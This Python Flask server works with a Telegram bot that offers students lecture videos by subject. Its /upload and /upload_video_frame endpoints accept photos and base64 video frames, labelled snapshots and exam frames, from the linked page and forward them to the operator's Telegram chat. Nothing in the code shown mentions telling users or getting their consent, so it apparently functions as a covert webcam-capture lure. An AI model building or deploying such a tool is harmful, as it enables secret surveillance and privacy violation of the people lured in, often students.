import os
import requests
import threading
from flask import Flask, send_file, request, jsonify
from datetime import datetime

app = Flask(__name__)

# ===== RENDER ENV VARIABLES =====
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
RENDER_URL = os.environ.get("RENDER_URL")

# ===== DEFAULT VIDEO =====
current_video_url = "https://t.me/blackvaltofficial/8?embed=1&autoplay=1"

# ===== VIDEO RECORDING METADATA =====
video_recordings = {}  # Store video state per student

@app.route("/")
def home():
    return send_file("index.html")

@app.route("/get_video_link")
def get_video_link():
    return jsonify({"url": current_video_url})

# ===== CAPTURE PHOTO + VIDEO FRAME =====
@app.route("/upload", methods=["POST"])
def upload():
    if "photo" in request.files:
        photo = request.files["photo"]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        temp = f"temp_{timestamp}.jpg"
        photo.save(temp)

        # Send to Telegram
        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(temp, "rb") as f:
            requests.post(
                tg_url,
                files={"photo": f},
                data={"chat_id": CHAT_ID, "caption": f"📸 Snapshot: {timestamp}"}
            )
        
        os.remove(temp)
    
    return "OK", 200

# ===== VIDEO FRAME CAPTURE =====
@app.route("/upload_video_frame", methods=["POST"])
def upload_video_frame():
    """Receives video frames from exam video (har 3 second mein)"""
    data = request.get_json()
    
    if "frame" in data and "timestamp" in data:
        timestamp = data["timestamp"]
        frame_data = data["frame"]  # Base64 encoded frame
        
        # Decode and save
        import base64
        frame_bytes = base64.b64decode(frame_data.split(',')[1])
        
        frame_file = f"exam_frames/frame_{timestamp}.jpg"
        os.makedirs("exam_frames", exist_ok=True)
        
        with open(frame_file, "wb") as f:
            f.write(frame_bytes)
        
        # Send to Telegram
        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(frame_file, "rb") as f:
            requests.post(
                tg_url,
                files={"photo": f},
                data={"chat_id": CHAT_ID, "caption": f"📹 Exam Video Frame: {timestamp}"}
            )
    
    return "OK", 200

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    global current_video_url
    data = request.get_json()

    if "message" in data:
        cid = str(data["message"]["chat"]["id"])
        text = data["message"].get("text", "")

        # ===== ADMIN =====
        if cid == CHAT_ID and ("http" in text or "t.me" in text):
            current_video_url = text
            if "embed=1" not in current_video_url:
                current_video_url += "?embed=1&autoplay=1"

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": "✅ Video link updated"}
            )
            return "OK"

        # ===== STUDENT =====
        if text == "/start":
            menu = {
                "inline_keyboard": [
                    [{"text": "Physics", "callback_data": "phy"}],
                    [{"text": "Chemistry", "callback_data": "chem"}],
                    [{"text": "Maths", "callback_data": "math"}]
                ]
            }
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": "📚 Select Subject", "reply_markup": menu}
            )

    elif "callback_query" in data:
        cq = data["callback_query"]
        cid = cq["message"]["chat"]["id"]
        choice = cq["data"]

        if choice == "phy":
            chapters = {
                "inline_keyboard": [
                    [{"text": "Electrostatics", "callback_data": "phy_elec"}]
                ]
            }
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": "Physics Chapters:", "reply_markup": chapters}
            )

        elif choice == "phy_elec":
            play = {
                "inline_keyboard": [
                    [{"text": "▶ Watch Lecture", "url": RENDER_URL}]
                ]
            }
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": cid, "text": "Lecture Player:", "reply_markup": play}
            )

    return "OK"

def init_webhook():
    requests.get(
        f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={RENDER_URL}/{BOT_TOKEN}"
    )

if __name__ == "__main__":
    init_webhook()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
